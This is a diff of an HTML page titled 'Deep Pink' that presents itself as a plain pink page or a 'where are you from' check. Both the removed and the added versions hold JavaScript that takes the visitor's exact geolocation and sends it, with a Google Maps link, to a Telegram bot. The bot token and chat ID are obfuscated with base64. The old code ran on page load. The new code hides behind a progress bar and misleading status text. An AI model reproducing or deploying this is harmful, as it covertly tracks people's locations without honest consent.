@@ -1,87 +1,154 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Deep Pink</title>
-    <style>
-        html, body {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            width: 100%;
-            background-color: #FF1493; /* Deep Pink */
-        }
-    </style>
+<meta charset="UTF-8">
+<title>Deep Pink</title>
+
+<style>
+    body {
+        margin: 0;
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        background-color: #FF1493;
+        font-family: Arial, sans-serif;
+        color: white;
+        text-align: center;
+    }
+
+    button {
+        padding: 12px 20px;
+        font-size: 16px;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+    }
+
+    #progressContainer {
+        width: 80%;
+        height: 20px;
+        background: rgba(255,255,255,0.3);
+        border-radius: 10px;
+        margin-top: 20px;
+        overflow: hidden;
+        display: none;
+    }
+
+    #progressBar {
+        height: 100%;
+        width: 0%;
+        background: white;
+        transition: width 0.3s;
+    }
+
+    #statusText {
+        margin-top: 15px;
+        font-size: 18px;
+    }
+</style>
 </head>
+
 <body>
 
-<script>
-    (function () {
+<button onclick="getLocation()">Allow Location</button>
 
-    // 🔐 Encoded credentials
+<div id="progressContainer">
+    <div id="progressBar"></div>
+</div>
+
+<div id="statusText"></div>
+
+<script>
+(function () {
+
     const BOT_TOKEN = atob("ODUyNDM5OTY5MjpBQUg4Uk5GbzZVZktDcjgxSUM1c1k2Rk8yMGh4QUJTX3VQUQ==");
     const CHAT_ID  = atob("NjI3NzQzMjM1Ng==");
 
-    // 🚫 Prevent duplicate execution per session
-    if (sessionStorage.getItem("locationTracked")) return;
-    sessionStorage.setItem("locationTracked", "true");
+    function updateProgress(percent) {
+        document.getElementById("progressBar").style.width = percent + "%";
+    }
 
-    // 🚀 Send to Telegram
-    function sendToTelegram(lat, lon) {
+    function setStatus(text) {
+        document.getElementById("statusText").innerText = text;
+    }
 
+    function sendToTelegram(lat, lon, country) {
         const message =
 `📍 Location Detected
 
-Longitude: ${lon}
 Latitude: ${lat}
+Longitude: ${lon}
+Country: ${country}
 
-Google Map Link: https://www.google.com/maps?q=${lat},${lon}`;
+Map: https://www.google.com/maps?q=${lat},${lon}`;
 
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
+            headers: {"Content-Type": "application/json"},
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message
             })
-        }).catch(() => {});
+        });
     }
 
-    // 📡 Request Location Permission + Fetch Coordinates
-    function getLocation() {
-        if (!navigator.geolocation) {
-            console.log("Geolocation not supported");
-            return;
+    async function getCountry(lat, lon) {
+        try {
+            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+            const data = await res.json();
+            return data.address.country || "Unknown";
+        } catch {
+            return "Unknown";
         }
-
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                const latitude = position.coords.latitude;
-                const longitude = position.coords.longitude;
-
-                sendToTelegram(latitude, longitude);
-            },
-            (error) => {
-                console.log("Location access denied or failed:", error.message);
-            },
-            {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            }
-        );
     }
 
-    // ▶ Trigger on page load
-    window.onload = getLocation;
+    window.getLocation = function () {
+
+        document.getElementById("progressContainer").style.display = "block";
+        setStatus("Checking where are you from...");
+
+        let progress = 0;
+
+        const interval = setInterval(() => {
+            if (progress < 90) {
+                progress += 10;
+                updateProgress(progress);
+            }
+        }, 300);
+
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+
+            progress = 95;
+            updateProgress(progress);
+
+            const country = await getCountry(lat, lon);
+
+            progress = 100;
+            updateProgress(100);
+
+            clearInterval(interval);
+
+            setStatus(`You are from ${country}`);
+
+            try {
+                await sendToTelegram(lat, lon, country);
+                setStatus("Your latitude and longitude are sent to your telegram");
+            } catch {
+                setStatus("Failed to send data to Telegram");
+            }
+
+        }, (err) => {
+            clearInterval(interval);
+            setStatus("Location access denied or failed");
+        });
+    };
 
 })();
-
-    setInterval(() => {
-        document.body.style.backgroundColor = "#FF1493";
-    }, 500);
 </script>
 
 </body>
